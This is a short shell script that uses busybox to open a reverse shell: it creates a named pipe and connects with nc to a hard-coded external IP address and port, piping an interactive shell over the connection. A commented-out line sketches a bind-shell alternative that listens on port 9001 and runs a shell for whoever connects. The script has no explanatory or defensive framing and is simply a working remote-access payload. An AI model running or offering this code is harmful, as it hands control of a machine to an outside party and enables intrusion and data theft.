#./busybox sh

./busybox mkfifo backpipe
./busybox nc 13.68.212.90 10000 < backpipe | ./busybox sh &> backpipe

#./busybox nc -l -p 9001 -e ./busyb
# ox sh
